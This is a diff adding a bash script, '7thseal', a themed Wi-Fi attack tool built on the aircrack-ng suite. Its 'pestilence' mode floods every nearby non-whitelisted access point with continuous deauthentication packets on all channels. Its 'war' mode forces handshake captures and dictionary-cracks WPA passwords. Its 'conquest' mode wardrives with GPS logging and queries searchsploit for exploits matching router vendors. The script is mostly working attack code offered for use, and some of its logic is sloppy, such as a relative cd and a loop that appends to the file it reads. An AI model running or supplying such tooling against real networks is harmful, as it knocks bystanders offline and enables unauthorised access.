@@ -1,0 +1,148 @@
+#!/bin/bash
+mkdir /etc/7thseal 2> /dev/null
+cd 7thseal
+rm /etc/7thseal/whitelist
+cat /etc/7thseal/banner
+echo "Welcome To the Apocalypse choose your Rider [war/death/conquest/pestilence]"
+read UI
+echo "Would you like to import a Whitelist [y/n]"
+read WL
+if [[ $WL == y ]]
+then
+echo "enter the full file path to your whitelist"
+read l1st
+mv $l1st /etc/7thseal/whitelist
+elif [[ $WL == n ]]
+then
+echo "Enter Your Whitelist mac xx:xx:xx:xx:xx:xx enter exit to create no Whitelist"
+read fox
+echo $fox >> /etc/7thseal/whitelist
+while [[ $fox != "exit" ]]
+do
+	echo "Enter Your Whitelist mac xx:xx:xx:xx:xx:xx enter exit to Finish"
+	read fox
+	echo $fox >> /etc/7thseal/whitelist
+done
+fi
+#Switches the interface 
+#interface=$(ip addr | grep wlan | awk '{print $2}'|awk -F ":" '{print $1}'|head -1)
+interface=wlan1
+if [[ $interface == wlan*mon ]]
+then
+airmon-ng stop $interface
+interface=$(ip addr | grep wlan | awk '{print $2}'|awk -F ":" '{print $1}'|head -1)
+airmon-ng start $interface
+else
+airmon-ng start $interface
+fi
+#Runs airdump
+find /etc/7thseal | grep trooper|xargs rm 2>/dev/null
+find /etc/7thseal | grep Channels|xargs rm 2>/dev/null
+find /etc/7thseal | grep storm|xargs rm 2>/dev/null
+find /etc/7thseal | grep dead|xargs rm 2>/dev/null
+find /etc/7thseal | grep routers|xargs rm 2>/dev/null
+find /etc/7thseal | grep exploits|xargs rm 2>/dev/null
+find /etc/7thseal | grep eyes|xargs rm 2>/dev/null
+find /etc/7thseal | grep SEE|xargs rm 2>/dev/null
+interface=$(ip addr | grep wlan | awk '{print $2}'|awk -F ":" '{print $1}'|head -1)
+xterm -e airodump-ng -w /etc/7thseal/trooper -c 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,149,153,157,161,165 $interface &
+
+#Grabs all The Bssids
+sleep 60
+ps -elf |grep xterm|awk '{print $4}'|xargs kill
+cat /etc/7thseal/trooper-01.log.csv | awk -F "," '{print $4}'| sort -u| grep -v "BSSID" > /etc/7thseal/trooper
+cat /etc/7thseal/trooper-01.kismet.csv |awk -F ";" '{print $6}'|grep -v Channel > /etc/7thseal/Channels
+while read mac
+do
+cat /etc/7thseal/trooper | grep -v "$mac" >> /etc/7thseal/trooper
+done < /etc/7thseal/whitelist
+
+# Da Bomb
+if [[ $UI == pestilence ]]
+then
+echo -e "                                     \n                                            @@@      @@@                                                         \n                                          @@.           @@.                                                      \n                                       @/                   @.                                                   \n                                     @                                                                           \n                                    @                                                                            \n                                   @                                                                             \n                                   @                                                                             \n              .@@@@@@&             @                                                                             \n            @*         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                                                    \n           @                       @                                                                             \n           @                       @                                                                             \n            @           @          @                                                                             \n             (@%     @@            @                                                                             \n                 @@@               @                                                                             \n                                   @                           .@(                                               \n                                   @               @               &@                                            \n                                   @              @ @               %(                                           \n                                   @             @   @              @                                            \n                                   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&                                              \n                                              @#       @*                                                        \n                                             @.         &&                                                       \n                                            @&&&&&&&&&&&&@@                                                      \n   ▄███████▄    ▄████████    ▄████████     ███      ▄█   ▄█          ▄████████ ███▄▄▄▄    ▄████████    ▄████████ \n  ███    ███   ███    ███   ███    ███ ▀█████████▄ ███  ███         ███    ███ ███▀▀▀██▄ ███    ███   ███    ███ \n  ███    ███   ███    █▀    ███    █▀     ▀███▀▀██ ███▌ ███         ███    █▀  ███   ███ ███    █▀    ███    █▀  \n  ███    ███  ▄███▄▄▄       ███            ███   ▀ ███▌ ███        ▄███▄▄▄     ███   ███ ███         ▄███▄▄▄     \n▀█████████▀  ▀▀███▀▀▀     ▀███████████     ███     ███▌ ███       ▀▀███▀▀▀     ███   ███ ███        ▀▀███▀▀▀     \n  ███          ███    █▄           ███     ███     ███  ███         ███    █▄  ███   ███ ███    █▄    ███    █▄  \n  ███          ███    ███    ▄█    ███     ███     ███  ███▌    ▄   ███    ███ ███   ███ ███    ███   ███    ███ \n ▄████▀        ██████████  ▄████████▀     ▄████▀   █▀   █████▄▄██   ██████████  ▀█   █▀  ████████▀    ██████████ \n                                                        ▀                                                        \n"
+echo -e "                          %############################                         \n                     #########                     #########                    \n                 #######          #############          #######                \n              ######       ###########################       ######             \n           &####         ###############################        ,####&          \n         #####            #############################            #####        \n       #####               \#########################\               #####      \n      ####                   #######################                   ####     \n    &###                      #####################                      ####   \n   ####                         #################                         ####  \n  %###                           ###############                           #### \n  ###                                                                       ### \n ####                                                                       ####\n ###                                #########                                ###\n ###                              #############                              ###\n ###   %%%%%%%%%%%%%%%%%%%%%     ,#############      %%%%%%%%%%%%%%%%%%%%%   ###\n ###   ,#####################     #############     #####################,   ###\n ###    #####################       #########      ,#####################    ###\n ####   #######################                   #######################   ####\n  ###    #########################             #########################    ### \n  (###    #######################               #######################    ###( \n   ####    #####################                 #####################    ####  \n    ,###    *#################                     #################,    ###    \n      ####    ###############                       ###############    ####     \n       &####    ###########\                         \###########    ####&      \n         #####     #######                             #######     #####        \n           %####&     ###                               ###     (####%          \n              ######                                         ######             \n                 #######                                 #######                \n                     #########                     #########                    \n                           ###########################                          \n"
+while read x
+do
+        for i in {{1..13},36,40,44,48,149,153,157,161,165}
+        do
+        iwconfig $interface channel $i
+        x-terminal-emulator -e aireplay-ng -0 0 -a $x $interface &
+        done
+done < /etc/7thseal/trooper
+
+# Wardrive mode
+elif [[ $UI == war ]]
+then
+echo -e "Yb        dP    db    88\"\"Yb 8888b.  88\"\"Yb 88 Yb    dP 888888     8b    d8  dP\"Yb  8888b.  888888 \n Yb  db  dP    dPYb   88__dP  8I  Yb 88__dP 88  Yb  dP  88__       88b  d88 dP   Yb  8I  Yb 88__   \n  YbdPYbdP    dP__Yb  88\"Yb   8I  dY 88\"Yb  88   YbdP   88\"\"       88YbdP88 Yb   dP  8I  dY 88\"\"   \n   YP  YP    dP\"\"\"\"Yb 88  Yb 8888Y\"  88  Yb 88    YP    888888     88 YY 88  YbodP  8888Y\"  888888 \n"
+echo "enter the dictionary file:"
+read dic
+echo  "Would you like to attack all [y/n]"
+read mode
+xterm -e airodump-ng -c 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,149,153,157,161,165 -w /etc/7thseal/storm  $interface &
+if [[ $mode == y ]]
+then
+while read z
+do
+        while read s
+        do
+	for m in {1..5}
+        do
+	iwconfig $interface channel $s
+        x-terminal-emulator -e aireplay-ng -0 10  -a $z $interface &
+	sleep 3
+	done
+        done < /etc/7thseal/Channels
+done < /etc/7thseal/trooper
+
+elif [[ $mode == n ]]
+then
+echo "enter the bssid of target"
+read target
+while read s
+ do
+  for m in {1..5}
+	do
+        iwconfig $interface channel $s
+        x-terminal-emulator -e aireplay-ng -0 10  -a $target $interface &
+        sleep 3
+        done
+done < /etc/7thseal/Channels
+fi
+sleep 60
+ps -elf |grep xterm|awk '{print $4}'|xargs kill
+echo 'Do you wish to Crack the password?[y/n]'
+read passw
+if [[ $passw == n ]]
+then
+echo 'your pcap file is /etc/7thseal/storm-01.cap'
+else
+while read f
+do
+aircrack-ng /etc/7thseal/storm-01.cap -w $dic -b $f
+done < /etc/7thseal/trooper
+fi
+
+#Searches OUIs of routers to help find an exploit
+elif [[ $UI == conquest ]]
+then
+echo " _______  _______  _        _______           _______  _______ _________";echo "(  ____ \(  ___  )( (    /|(  ___  )|\     /|(  ____ \(  ____ \\__   __/";echo "| (    \/| (   ) ||  \  ( || (   ) || )   ( || (    \/| (    \/   ) (   ";echo "| |      | |   | ||   \ | || |   | || |   | || (__    | (_____    | |   ";echo "| |      | |   | || (\ \) || |   | || |   | ||  __)   (_____  )   | |   ";echo "| |      | |   | || | \   || | /\| || |   | || (            ) |   | |   ";echo "| (____/\| (___) || )  \  || (_\ \ || (___) || (____/\/\____) |   | |   ";echo "(_______/(_______)|/    )_)(____\/_)(_______)(_______/\_______)   )_(   ";echo "                                                                        ";
+while true
+do
+xterm -e airodump-ng --gpsd -c 1,2,3,4,5,6,7,8,9,10,11,12,13,36,40,44,48,149,153,157,161,165 -w /etc/7thseal/eyes  $interface &
+sleep 60
+cat /etc/7thseal/eyes-01.log.csv |awk -F "," '{print "TIME:" $1" ESSID:"$3 " BSSID:" $4 " RSSI:" $5 " SEC:" $6" LAT:"$7 " LON:"$8  " TYPE:"$11  }' >> /etc/7thseal/SEE
+ps -elf |grep xterm|awk '{print $4}'|xargs kill
+sleep 5
+cat /etc/7thseal/eyes-01.log.csv | awk -F "," '{print $4}'| sort -u| grep -v "BSSID"| awk -F ":" '{print $1,$2,$3}'|tr " " "-"| sort -u |grep -v '\-\-' >>/etc/7thseal/eyes
+while read q;do grep $q /etc/7thseal/oui | awk '{print $3}'|sort -u|tr "," "\0">> /etc/7thseal/routers;done</etc/7thseal/eyes
+while read q
+do
+echo "----------------------------------------$(searchsploit $q)" | tr "|" "\n" >>  /etc/7thseal/exploits
+done < /etc/7thseal/routers
+find /etc/7thseal | grep eyes|xargs rm
+done
+fi
+
+# Creates [Redacted]
+
